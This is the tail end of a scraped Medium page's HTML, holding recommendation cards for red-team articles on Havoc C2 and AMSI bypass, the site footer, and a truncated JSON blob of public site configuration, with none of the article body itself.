acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="114" aria-labelledby="114"><a tabindex="-1" href="https://medium.com/@manan07?source=read_next_recirc-----75d231b2cac6----1---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div class="l fg"><img alt="Manan" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/0*NJzvA8IPQE5LcMMR" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="115" aria-labelledby="115"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" href="https://medium.com/@manan07?source=read_next_recirc-----75d231b2cac6----1---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><p class="bc b ds z acm acn aco acp acq acr acs act bh">Manan</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/@manan07/microsoft-devtunnel-with-havoc-c2-f72de5fcd9ba?source=read_next_recirc-----75d231b2cac6----1---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">Microsoft Devtunnel with Havoc C2</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">During an internal red team engagement, i didn’t have any access to CDN, redirector or reverse proxy. I just had a Windows Laptop and a…</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>May 6</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" href="https://medium.com/@manan07/microsoft-devtunnel-with-havoc-c2-f72de5fcd9ba?source=read_next_recirc-----75d231b2cac6----1---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="116" aria-labelledby="116"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Ff72de5fcd9ba&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40manan07%2Fmicrosoft-devtunnel-with-havoc-c2-f72de5fcd9ba&amp;source=-----75d231b2cac6----1-----------------bookmark_preview----9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span><div class="j i d"><div class="su be sv lg"></div></div></div></div></div></div></div></div></article></div></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b" tabindex="0"><div class="abq"><div aria-label="AMSI Bypass Memory Patch Technique in 2024"><div class="abs abt abu abv abw"><img alt="AMSI Bypass Memory Patch Technique in 2024" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*YGwVi4Rkj2HBQyyC5bAbUQ.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="117" aria-labelledby="117"><a tabindex="-1" href="https://medium.com/@sam.rothlisberger?source=read_next_recirc-----75d231b2cac6----2---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div class="l fg"><img alt="Sam Rothlisberger" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/1*Fzh2QBHCL67uIEt-y9at1w.jpeg" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="118" aria-labelledby="118"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" href="https://medium.com/@sam.rothlisberger?source=read_next_recirc-----75d231b2cac6----2---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><p class="bc b ds z acm acn aco acp acq acr acs act bh">Sam Rothlisberger</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b?source=read_next_recirc-----75d231b2cac6----2---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">AMSI Bypass Memory Patch Technique in 2024</h2></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Jan 21</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" href="https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b?source=read_next_recirc-----75d231b2cac6----2---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="119" aria-labelledby="119"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Ff5560022752b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Famsi-bypass-memory-patch-technique-in-2024-f5560022752b&amp;source=-----75d231b2cac6----2-----------------bookmark_preview----9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span><div class="j i d"><div class="su be sv lg"></div></div></div></div></div></div></div></div></article></div></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://medium.com/@r1ckyr3c0n/havoc-c2-framework-part-1-installation-2024-2fbb8a1fe31c" tabindex="0"><div class="abq"><div aria-label="Havoc C2 Framework Part 1: Installation (2024)"><div class="abs abt abu abv abw"><img alt="Havoc C2 Framework Part 1: Installation (2024)" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*oGnXpc2AY_2_YMshul6o7A.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="120" aria-labelledby="120"><a tabindex="-1" href="https://medium.com/@r1ckyr3c0n?source=read_next_recirc-----75d231b2cac6----3---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div class="l fg"><img alt="r1ckyr3c0n" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/1*qDsQEBWmiuik_AIENZd70g.png" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="121" aria-labelledby="121"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" href="https://medium.com/@r1ckyr3c0n?source=read_next_recirc-----75d231b2cac6----3---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><p class="bc b ds z acm acn aco acp acq acr acs act bh">r1ckyr3c0n</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/@r1ckyr3c0n/havoc-c2-framework-part-1-installation-2024-2fbb8a1fe31c?source=read_next_recirc-----75d231b2cac6----3---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">Havoc C2 Framework Part 1: Installation (2024)</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">After using Cobalt Strike in the Red Team Ops (RTO) course, I wanted to see what open-source Command and Control (C2) frameworks were…</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Jan 5</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" href="https://medium.com/@r1ckyr3c0n/havoc-c2-framework-part-1-installation-2024-2fbb8a1fe31c?source=read_next_recirc-----75d231b2cac6----3---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="122" aria-labelledby="122"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F2fbb8a1fe31c&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40r1ckyr3c0n%2Fhavoc-c2-framework-part-1-installation-2024-2fbb8a1fe31c&amp;source=-----75d231b2cac6----3-----------------bookmark_preview----9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div><div class="su be sv dh di aeg aeh aei"></div><a class="bc b bd z bh qt aem aen aeo li le wf es et eu aep aeq aer ex vq vr aes aet aeu ey ez fa bj fb fc" href="https://medium.com/?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><div class="l fc">See more recommendations</div></a></div></div></div><div class="h k j"><div class="su be sv tb"></div><div class="ab by"><div class="cf be fw fx fy fz"><div class="tc ab kg ix"><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Help</p></a></div><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Status</p></a></div><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">About</p></a></div><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Careers</p></a></div><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="mailto:pressinquiries@medium.com?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Press</p></a></div><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Blog</p></a></div><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Privacy</p></a></div><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Terms</p></a></div><div class="td te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Text to speech</p></a></div><div class="td l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----75d231b2cac6--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20240614-164831-9a60d093e4"</script><script>window.__GRAPHQL_URI__ = "https://gustavshen.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-75d231b2cac6","user-39cded15042e"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"updatedPostPreviewsEnabled":true,"lohpExperimentEnabled":"group_2","prideLogoEnabled":true},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":true,"routingEntity":{"type":"USER","id":"39cded15042e","explicit":true},"viewerIsBot":false},"debug":{"requestId":"0210fc2d-6677-48fe-9dcb-e130187c1b22","hybridDevServices":[],"originalSpanCarrier":{"ot-tracer-spanid":"33f20c6353160885","ot-tracer-traceid":"2fa1b5ab770b7561","ot-tracer-sampled":"true"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fgustavshen.medium.com\u002Fbypass-amsi-on-windows-11-75d231b2cac6","host":"gustavshen.medium.com","hostname":"gustavshen.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20240614-164831-9a60d093e4","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20240614-164831-9a60d093e4","commit":"9a60d093e495f57fdaaa42cae44f9c9daf0058c1"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"1*OMF3fSqH8t4xBJ9-6oZDZw.png","height":106,"width":545},"postLogo":{"imageId":"1*kFrc4tBFM_tCis-2Ic87WA.png","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories 